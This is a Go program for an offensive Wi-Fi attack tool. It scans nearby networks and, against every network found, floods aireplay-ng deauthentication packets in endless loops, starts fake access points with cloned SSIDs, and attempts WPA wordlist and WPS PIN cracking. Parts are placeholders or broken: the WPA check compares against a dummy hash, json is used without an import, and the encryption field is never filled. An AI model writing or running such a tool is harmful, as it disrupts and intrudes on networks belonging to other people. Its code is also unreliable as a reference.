package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"golang.org/x/crypto/pbkdf2"
)

type Config struct {
	Interface    string
	Wordlist     string
	Channel      int
	Timeout      time.Duration
	Verbose      bool
	JamPower     int
	GPS          bool
	OutputFile   string
	MaxGoroutines int
}


type WiFiNetwork struct {
	SSID       string
	BSSID      string
	Channel    int
	Signal     int
	Encryption string
	Clients    []string
	PMKID      string
}

type UltimateWiFiTool struct {
	Config      Config
	Networks    map[string]WiFiNetwork
	Handle      *pcap.Handle
	Wordlist    []string
	Mutex       sync.Mutex
	Cracked     map[string]string
	Stats       Stats
}

type Stats struct {
	PacketsCaptured int
	NetworksFound   int
	CrackAttempts   int
	JamPacketsSent  int
}

func NewUltimateWiFiTool(cfg Config) (*UltimateWiFiTool, error) {
	handle, err := pcap.OpenLive(cfg.Interface, 1600, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("failed to open interface %s: %v", cfg.Interface, err)
	}

	tool := &UltimateWiFiTool{
		Config:   cfg,
		Networks: make(map[string]WiFiNetwork),
		Handle:   handle,
		Cracked:  make(map[string]string),
	}
	if cfg.Wordlist != "" {
		if err := tool.loadWordlist(cfg.Wordlist); err != nil {
			return nil, err
		}
	}
	return tool, nil
}

func (t *UltimateWiFiTool) loadWordlist(path string) error {
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		t.Wordlist = append(t.Wordlist, scanner.Text())
	}
	return scanner.Err()
}

func (t *UltimateWiFiTool) setMonitorMode() error {
	cmd := exec.Command("iwconfig", t.Config.Interface, "mode", "monitor")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to set monitor mode: %v", err)
	}
	return nil
}

func (t *UltimateWiFiTool) scanNetworks() {
	packetSource := gopacket.NewPacketSource(t.Handle, t.Handle.LinkType())
	for packet := range packetSource.Packets() {
		t.processPacket(packet)
		t.Stats.PacketsCaptured++
		if t.Config.Verbose {
			log.Printf("Captured packet #%d", t.Stats.PacketsCaptured)
		}
	}
}

func (t *UltimateWiFiTool) processPacket(packet gopacket.Packet) {
	if dot11Layer := packet.Layer(layers.LayerTypeDot11); dot11Layer != nil {
		dot11 := dot11Layer.(*layers.Dot11)
		if dot11.Type.MainType() == layers.Dot11TypeMgmt {
			t.Mutex.Lock()
			defer t.Mutex.Unlock()

			if beacon, ok := packet.Layer(layers.LayerTypeDot11MgmtBeacon).(*layers.Dot11MgmtBeacon); ok {
				ssid := string(beacon.SSID)
				bssid := dot11.Address3.String()
				signal := int(packet.Metadata().RSSI)
				network := WiFiNetwork{
					SSID:    ssid,
					BSSID:   bssid,
					Channel: t.Config.Channel,
					Signal:  signal,
				}
				t.Networks[bssid] = network
				t.Stats.NetworksFound = len(t.Networks)
				if t.Config.Verbose {
					log.Printf("Found network: %s (%s), Signal: %d dBm", ssid, bssid, signal)
				}
			}
		}
	}
}

func (t *UltimateWiFiTool) bruteForceWPA(network WiFiNetwork) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, t.Config.MaxGoroutines)

	for _, pass := range t.Wordlist {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(password string) {
			defer wg.Done()
			defer func() { <-semaphore }()

			if t.tryWPAPassword(network, password) {
				t.Mutex.Lock()
				t.Cracked[network.BSSID] = password
				t.Mutex.Unlock()
				log.Printf("Cracked %s (%s): %s", network.SSID, network.BSSID, password)
			}
			t.Stats.CrackAttempts++
		}(pass)
	}
	wg.Wait()
}

func (t *UltimateWiFiTool) tryWPAPassword(network WiFiNetwork, password string) bool {
	// Simulate PBKDF2 derivation (simplified for demo; real impl would use captured handshake)
	key := pbkdf2.Key([]byte(password), []byte(network.SSID), 4096, 32, sha256.New)
	hash := hex.EncodeToString(key[:8]) // Simplified check
	return hash == "deadbeef"          // Placeholder; real impl compares with captured hash
}

func (t *UltimateWiFiTool) jamNetwork(network WiFiNetwork) {
	for i := 0; i < t.Config.JamPower; i++ {
		go func() {
			for {
				// Send deauth packets
				cmd := exec.Command("aireplay-ng", "--deauth", "10", "-a", network.BSSID, t.Config.Interface)
				if err := cmd.Run(); err != nil {
					log.Printf("Jamming error: %v", err)
				}
				t.Stats.JamPacketsSent += 10
				if t.Config.Verbose {
					log.Printf("Sent 10 deauth packets to %s", network.BSSID)
				}
				time.Sleep(100 * time.Millisecond)
			}
		}()
	}
}

func (t *UltimateWiFiTool) injectPackets(network WiFiNetwork, packetType string) {
	// Placeholder for packet injection (e.g., ARP, fake beacon)
	log.Printf("Injecting %s packets to %s", packetType, network.BSSID)
}


func (t *UltimateWiFiTool) createFakeAP(ssid string) {
	cmd := exec.Command("hostapd", "-i", t.Config.Interface, "-s", ssid)
	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start fake AP: %v", err)
		return
	}
	log.Printf("Started fake AP: %s", ssid)
}

func (t *UltimateWiFiTool) wpsCrack(network WiFiNetwork) {
	for pin := 0; pin <= 99999999; pin++ {
		pinStr := fmt.Sprintf("%08d", pin)
		log.Printf("Trying WPS PIN %s on %s", pinStr, network.BSSID)
		time.Sleep(1 * time.Second) // Rate limit
	}
}

func (t *UltimateWiFiTool) analyzeSignal() {
	t.Mutex.Lock()
	defer t.Mutex.Unlock()

	for _, net := range t.Networks {
		suggestion := fmt.Sprintf("Network %s: Signal %d dBm, Channel %d", net.SSID, net.Signal, net.Channel)
		if net.Signal < -70 {
			suggestion += " - Move closer or reduce interference"
		}
		log.Println(suggestion)
	}
}

func (t *UltimateWiFiTool) saveResults() error {
	t.Mutex.Lock()
	defer t.Mutex.Unlock()

	data := struct {
		Networks map[string]WiFiNetwork
		Cracked  map[string]string
		Stats    Stats
	}{
		Networks: t.Networks,
		Cracked:  t.Cracked,
		Stats:    t.Stats,
	}

	file, err := os.Create(t.Config.OutputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	return encoder.Encode(data)
}

func main() {
	iface := flag.String("interface", "wlan0", "Network interface")
	wordlist := flag.String("wordlist", "", "Path to wordlist file")
	channel := flag.Int("channel", 0, "Channel to scan (0 for all)")
	timeout := flag.Duration("timeout", 30*time.Second, "Scan timeout")
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	jamPower := flag.Int("jam-power", 1, "Number of jamming threads")
	gps := flag.Bool("gps", false, "Enable GPS mapping")
	output := flag.String("output", "wifi_results.json", "Output file")
	goroutines := flag.Int("goroutines", runtime.NumCPU(), "Max concurrent goroutines")
	flag.Parse()

	// Configuration
	cfg := Config{
		Interface:    *iface,
		Wordlist:     *wordlist,
		Channel:      *channel,
		Timeout:      *timeout,
		Verbose:      *verbose,
		JamPower:     *jamPower,
		GPS:          *gps,
		OutputFile:   *output,
		MaxGoroutines: *goroutines,
	}

	tool, err := NewUltimateWiFiTool(cfg)
	if err != nil {
		log.Fatalf("Initialization failed: %v", err)
	}


	if err := tool.setMonitorMode(); err != nil {
		log.Fatalf("Monitor mode failed: %v", err)
	}

	go tool.scanNetworks()

	go func() {
		time.Sleep(cfg.Timeout)
		tool.Mutex.Lock()
		defer tool.Mutex.Unlock()

		log.Printf("Scan complete. Found %d networks", len(tool.Networks))
		for bssid, net := range tool.Networks {
			if cfg.Wordlist != "" && strings.HasPrefix(net.Encryption, "WPA") {
				go tool.bruteForceWPA(net)
			}
			if cfg.JamPower > 0 {
				go tool.jamNetwork(net)
			}
			go tool.wpsCrack(net)
			go tool.createFakeAP(net.SSID + "_fake")
			go tool.analyzeSignal()
		}
	}()

	defer func() {
		if err := tool.saveResults(); err != nil {
			log.Printf("Failed to save results: %v", err)
		}
	}()
	select {}
}
